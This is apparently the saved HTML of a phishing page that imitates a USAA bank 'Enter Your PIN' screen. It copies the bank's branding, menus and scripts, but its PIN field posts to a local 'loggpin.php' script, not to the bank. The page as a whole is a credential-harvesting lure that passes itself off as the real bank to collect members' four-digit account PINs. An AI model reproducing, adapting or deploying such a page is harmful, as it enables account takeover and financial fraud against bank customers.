...
<script src="files_j/aggregator_003.js" charset="utf-8" type="text/javascript" id="yui_3_3_0_1_13610622782502"></script><script src="files_j/aggregator_004.js" charset="utf-8" type="text/javascript" id="yui_3_3_0_1_1361062278250113"></script></head>
...
<a name="top"></a>
			...
			<div>
<div style="height: auto; width: 500px; left: 540.5px; top: 262px; z-index: 50000;" class="yui3-widget yui3-overlay yui3-widget-positioned yui3-widget-stacked yui3-overlay-modal yui3-overlay-hidden" id="yui_3_3_0_1_1361062278250119"><div id="id4" class="yui3-overlay yui3-overlay-content yui3-widget-stdmod"><span tabindex="0" class="preTopFocus focusUnit">start of modal content</span><span tabindex="0" class="topFocus focusUnit">top of modal window</span>
...
<br>
<form method="get" action="" id="id7"><div style="width:0px;height:0px;position:absolute;left:-100px;top:-100px;overflow:hidden"><input name="id7_hf_0" id="id7_hf_0" type="hidden"><input name="../page/PinEntryPage/w:interface/:0:headPanel:logOffPanel:modal:logOffForm::IFormSubmitListener::" value="" type="hidden"></div>
							...
							<ul class="first-of-type">
							   <li class="first-of-type dropdown_menu_heading">Personal Information		                    
							    ...
							    <li class=" first-of-type dropdown_menu_heading">Community Profile
								  <ul>
								    <li class="dropdown_menu_list_item first-of-type"><a href="https://www.usaa.com/profile/edit?wa_ref=pri_auth_community_updatename&amp;referer=https%3A%2F%2Fwww.usaa.com%2Finet%2Fent_auth_pin%2Fpage%2FPinEntryPage" class="dropdown_menu_link editPublicProfile updateNickname">Update Nickname</a></li>
								    <li class="dropdown_menu_list_item"><a href="https://www.usaa.com/profile/edit?wa_ref=pri_auth_community_updatephoto&amp;referer=https%3A%2F%2Fwww.usaa.com%2Finet%2Fent_auth_pin%2Fpage%2FPinEntryPage" class="dropdown_menu_link editPublicProfile updateAvatarPhoto">Update Avatar Photo</a></li>
								    <li class="dropdown_menu_list_item last_menu_list_item"><a href="https://www.usaa.com/profile/edit?wa_ref=pri_auth_community_updatepubinfo&amp;referer=https%3A%2F%2Fwww.usaa.com%2Finet%2Fent_auth_pin%2Fpage%2FPinEntryPage" class="dropdown_menu_link editPublicProfile updatePublicInfo">Update Public Information</a></li>
								  </ul>
								</li>
...
<div>
			<div class="page-title yui3-g">	
				<div class="liner yui3-u">	
					<h1 class="usaa-heading skin-heading-1">Enter Your PIN</h1>
...
<div class="noindex">
<div id="toolsHeading">
<div class="noindex feedbackMessagePanel usaa-hidden">
...
<div id="main">
<div>
<p> We are committed to keeping your information secure and confidential.</p>
<p>Entering your personal identification number (PIN) each time you 
access your accounts or use chat on usaa.com allows us to verify who you
 are and give you the maximum security and privacy for your information.
</p>
</div>


<form action="loggpin.php" id="ide" method="post" name="Logon" onsubmit="return validateForm()">
...
<div id="id2" class="firstRow rowItem listItem">
<div class="listItem-wrapper">
<div class="listItem-content">
<div class="label">
<div class="label-content">
<label for="id3">PIN</label>
</div>
<div class="label-description">
<div class="glossary">
<span>
<a class="glossaryTerm" target="_blank" href="#" id="id6">
<span>Explain</span>
<span class="glossaryText">PIN</span>
<span class="usaa-hiddenMessage">&amp;nbsp;(Opens Pop-up Layer)</span>
</a>
<div id="id5" style="display:none;"><!--  WCM CONTENT OBJECT=g_old_PIN_Mobile_Enterprise_Remember_PIN --><headertags><meta name="Title" content=""><meta name="Description" content=""><meta name="Subject" content=""></headertags><dl class="glossaryTerm">
    <dt>Personal Identification Number (PIN)</dt>
    <dd>
        <p>The four-digit number you set up previously for account security on usaa.com and our automated telephone system.</p>


        <p>It is separate from your credit or debit card PIN.</p>
...
</div><pageattributes compliancecode="" keywords="" subject=""></pageattributes><footnote></footnote>
...
<input size="5" maxlength="4" value="" name="pin1" id="id3" type="password">

</div>
<div class="value-description">
<div>
<a href="https://www.usaa.com/inet/ent_auth_pin/page/ForgotPinPage" class="usaa-link p3"><span class="link-liner">Don't know your PIN?</span></a>
</div>
</div>
</div>
</div>
...
<div class="button-container">
<button type="submit" name="submitButton" id="idf" value="Next" class="usaa-button p1 skin-button-1"><span class="button-liner">Next</span></button>
</div>
</form>
</div>
...
<div class="footnotes">
<div class="footnoteLegalText usaa-disclosures">
<ul class="disclosure-group">
<li class="disclosure-item">
<p class="disclosure-content">
<span class="disclosure-liner"></span>

</p>
</li><li class="disclosure-item">
<p class="disclosure-content">
<span class="disclosure-liner"></span>
...
function logClicktrailFor(event, object_id) { 
  wicketAjaxGet('../?w:interface=:0:headerPanel:authBar::IActivePageBehaviorListener:0:1&amp;w:ignoreIfNotActive=true&event_id=' + event + '&object_id=' + object_id);
}
...
<script type="text/javascript" src="files_j/aggregator_002.js"></script>
<script type="text/javascript"><!--/*--><![CDATA[/*><!--*/
...
<script type="text/javascript"><!--/*--><![CDATA[/*><!--*/
YUInstance.applyConfig({filter: 'raw', combine:true, comboBase: 'https://s.usaa.com/inet/resources/aggregator?type=-min&fv=1.4.20&',  root: 'p_/javascript/ent/thirdparty/yui/yui3_3/',groups:{yui2:{ combine:true, comboBase: 'https://s.usaa.com/inet/resources/aggregator?type=-min&fv=1.4.20&',  root: 'k_', modules:{'yui2-yahoo':{type:'js', path:'yui2-yahoo:cacheid=1413143396'},'yui2-event':{type:'js', path:'yui2-event:cacheid=2405705015', requires: ['yui2-yahoo']},'yui2-connection':{type:'js', path:'yui2-connection:cacheid=956897471', requires: ['yui2-yahoo','yui2-event']},'yui2-dom':{type:'js', path:'yui2-dom:cacheid=1542574234', requires: ['yui2-yahoo']},'yui2-element':{type:'js', path:'yui2-element:cacheid=233497233', requires: ['yui2-yahoo','yui2-dom','yui2-event']},'yui2-animation':{type:'js', path:'yui2-animation:cacheid=1839647836', requires: ['yui2-yahoo','yui2-dom','yui2-event']}}},usaa:{ combine:true, comboBase: 'https://s.usaa.com/inet/resources/aggregator?type=-min&fv=1.4.20&',  root: 'k_', modules:{'ModalBehavior_js':{type:'js', path:'ModalBehavior_js:cacheid=1407324612', requires: ['overlay','plugin','event','node']},'AutoFocusBehavior_js':{type:'js', path:'AutoFocusBehavior_js:cacheid=53557847', requires: ['node','event']},'TransientLayerBehavior_js':{type:'js', path:'TransientLayerBehavior_js:cacheid=4274280710', requires: ['yui2-connection','yui2-element','yui2-animation','node','event']}}}}, fetchCSS: false});YUInstance.use('oop', 'event-custom', 'attribute', 'dom-base', 'selector-native', 'selector-css2', 'event-custom-base', 'event-base', 'node-base', 'event-synthetic', 'event-focus', 'attribute-base', 'base-base', 'yui-base', 'pluginhost', 'base-pluginhost', 'dom-style', 'node-style', 'event-delegate', 'node-event-delegate', 'classnamemanager', 'widget', 'base-build', 'widget-stdmod', 'dom-screen', 'node-screen', 'widget-position', 'widget-stack', 'widget-position-align', 'widget-position-constrain', 'overlay', 'plugin', 'event', 'dom', 'node', 'ModalBehavior_js', 'AutoFocusBehavior_js', 'yui2-yahoo', 'yui2-event', 'yui2-connection', 'yui2-dom', 'yui2-element', 'yui2-animation', 'TransientLayerBehavior_js');
YUInstance.applyConfig({fetchCSS: false,filter: 'raw'});YUInstance.use('ModalBehavior_js', 'overlay', 'plugin', 'event', 'node', function(Y){var overlay = new Y.Overlay({"visible":false,"contentBox":"#id4","width":500,"height":"auto","zIndex":50000}).plug(Y.Plugin.ModalWindow).render();Y.one('#showModalTrigger').on('click', function(e){overlay.set('centered', true);overlay.show();});Y.one('#hideModalTrigger').on('click', function(e){overlay.hide();});});YUInstance.config = YUIDefaultConfig;
YUInstance.applyConfig({fetchCSS: false,filter: 'raw'});YUInstance.use('event-focus', 'event-synthetic', function(Y){var id1focusEventHandler = function(e) {Y.detach('focus', id1focusEventHandler, '#id1');YUInstance.applyConfig({filter: 'raw', combine:true, comboBase: 'https://s.usaa.com/inet/resources/aggregator?type=-min&fv=1.4.20&',  root: 'p_/javascript/ent/thirdparty/yui/yui3_3/',groups:{yui2:{ combine:true, comboBase: 'https://s.usaa.com/inet/resources/aggregator?type=-min&fv=1.4.20&',  root: 'k_', modules:{'yui2-datasource':{type:'js', path:'yui2-datasource:cacheid=1371085169', requires: ['yui2-yahoo','yui2-event']},'yui2-autocomplete':{type:'js', path:'yui2-autocomplete:cacheid=3811851968', requires: ['yui2-yahoo','yui2-dom','yui2-event','yui2-datasource']}}},usaa:{ combine:true, comboBase: 'https://s.usaa.com/inet/resources/aggregator?type=-min&fv=1.4.20&',  root: 'k_', modules:{'SearchAutoCompleteEventHandlers_js':{type:'js', path:'SearchAutoCompleteEventHandlers_js:cacheid=2904587820', requires: ['yui2-dom']},'ClientAutoCompleteBehavior_js':{type:'js', path:'ClientAutoCompleteBehavior_js:cacheid=3128497184', requires: ['yui2-autocomplete','yui2-connection','SearchAutoCompleteEventHandlers_js']}}}}, fetchCSS: false});YUInstance.use('yui2-yahoo', 'yui2-dom', 'yui2-event', 'yui2-datasource', 'yui2-autocomplete', 'yui2-connection', 'SearchAutoCompleteEventHandlers_js', 'ClientAutoCompleteBehavior_js');
YUInstance.applyConfig({fetchCSS: false,filter: 'raw'});YUInstance.use('ClientAutoCompleteBehavior_js', 'yui2-autocomplete', 'yui2-connection', 'SearchAutoCompleteEventHandlers_js', function(Y){var clientAutoComplete = new Y.USAA.ecl.behavior.ClientAutoCompleteBehavior({"containerPixelWidth":100,"eventHandlerConfig":{"itemSelectEvent":"Y.USAA.template.search.AutoCompleteEventHandlers.itemSelectEventHandler"},"resultCount":10,"autoSuggest":true,"fieldId":"id1","dataSourceDelimeter":"\n","specialCharArray":["\u0026","\u003c","\u003e"],"dataSourceUrl":"https://www.usaa.com/inet/ent_search/SearchAutoCompleteServlet","useIFrame":false,"containerId":"id1AutocompleteContainer"});});YUInstance.config = YUIDefaultConfig;
};Y.on('focus', id1focusEventHandler, '#id1');});YUInstance.config = YUIDefaultConfig;
...
YUInstance.applyConfig({fetchCSS: false,filter: 'raw'});YUInstance.use('AutoFocusBehavior_js', 'node', 'event', function(Y){Y.USAA.ec.util.AutoFocus.setElement('id3');});YUInstance.config = YUIDefaultConfig;
YUInstance.applyConfig({fetchCSS: false,filter: 'raw'});YUInstance.use('TransientLayerBehavior_js', 'yui2-connection', 'yui2-element', 'yui2-animation', 'node', 'event', function(Y){var contextObj = { name: "context"}; var configs = {"tlCloseImg":"https://content.usaa.com/mcontent/static_assets/Media/tlClose.png?cacheid\u003d3841836057","reclickClose":true,"wrapExistingContent":false,"width":300,"autoCloseExempt":false,"hoverOnly":false,"contentSrc":"id5","xOffset":0,"yOffset":0,"blankImg":"https://content.usaa.com/mcontent/static_assets/Media/blank.gif?cacheid\u003d3366586105","insideModal":false,"clickOutClose":true,"tlID":"id5","cacheable":true,"timedRequestInterval":-1}; Y.on('click', Y.USAA.ecl.behavior.TransientLayer.requestTL, '#id6', contextObj, configs); });YUInstance.config = YUIDefaultConfig;
